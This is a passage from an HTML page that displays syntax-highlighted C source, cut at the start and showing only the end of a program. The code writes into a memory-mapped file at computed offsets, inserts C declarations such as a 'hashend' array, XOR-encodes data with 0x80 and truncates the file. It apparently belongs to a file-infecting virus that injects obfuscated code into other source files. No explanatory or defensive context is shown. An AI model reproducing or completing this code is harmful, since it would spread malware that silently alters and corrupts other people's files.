                    </span><span class="sc11">sprintf</span><span class="sc10">(</span><span class="sc11">ptr</span><span class="sc10">+</span><span class="sc11">size</span><span class="sc10">+</span><span class="sc11">ihole</span><span class="sc10">+</span><span class="sc11">thole</span><span class="sc10">+</span><span class="sc11">bhole</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"\";\n\tchar hashend[] = \""</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc11">bhole</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc4">22</span><span class="sc10">;</span><span class="sc0">
                    </span><span class="sc11">memcpy</span><span class="sc10">(</span><span class="sc11">ptr</span><span class="sc10">+</span><span class="sc11">size</span><span class="sc10">+</span><span class="sc11">ihole</span><span class="sc10">+</span><span class="sc11">thole</span><span class="sc10">+</span><span class="sc11">bhole</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">hashend</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">hashend</span><span class="sc10">));</span><span class="sc0">
                    </span><span class="sc11">bhole</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">hashend</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc11">sprintf</span><span class="sc10">(</span><span class="sc11">ptr</span><span class="sc10">+</span><span class="sc11">size</span><span class="sc10">+</span><span class="sc11">ihole</span><span class="sc10">+</span><span class="sc11">thole</span><span class="sc10">+</span><span class="sc11">bhole</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"\";\n"</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc11">bhole</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc4">3</span><span class="sc10">;</span><span class="sc0">
                    </span><span class="sc5">for</span><span class="sc10">(</span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc11">i</span><span class="sc10">&lt;</span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">hashend</span><span class="sc10">);</span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0">
                        </span><span class="sc11">hashend</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">^=</span><span class="sc0"> </span><span class="sc4">0x80</span><span class="sc10">;</span><span class="sc0">
                    </span><span class="sc11">ehole</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">hashend</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc11">memcpy</span><span class="sc10">(</span><span class="sc11">ptr</span><span class="sc10">+</span><span class="sc11">size</span><span class="sc10">+</span><span class="sc11">ihole</span><span class="sc10">+</span><span class="sc11">thole</span><span class="sc10">+</span><span class="sc11">bhole</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">hashend</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ehole</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc11">msync</span><span class="sc10">(</span><span class="sc11">ptr</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">size</span><span class="sc10">+</span><span class="sc11">page</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MS_SYNC</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc11">munmap</span><span class="sc10">(</span><span class="sc11">ptr</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">size</span><span class="sc10">+</span><span class="sc11">page</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc11">ftruncate</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">size</span><span class="sc10">+</span><span class="sc11">ihole</span><span class="sc10">+</span><span class="sc11">thole</span><span class="sc10">+</span><span class="sc11">bhole</span><span class="sc10">+</span><span class="sc11">ehole</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0"> </span><span class="sc5">else</span><span class="sc0">
                </span><span class="sc10">{</span><span class="sc0">
                    </span><span class="sc11">munmap</span><span class="sc10">(</span><span class="sc11">ptr</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">size</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
</span></div></body>
</html>
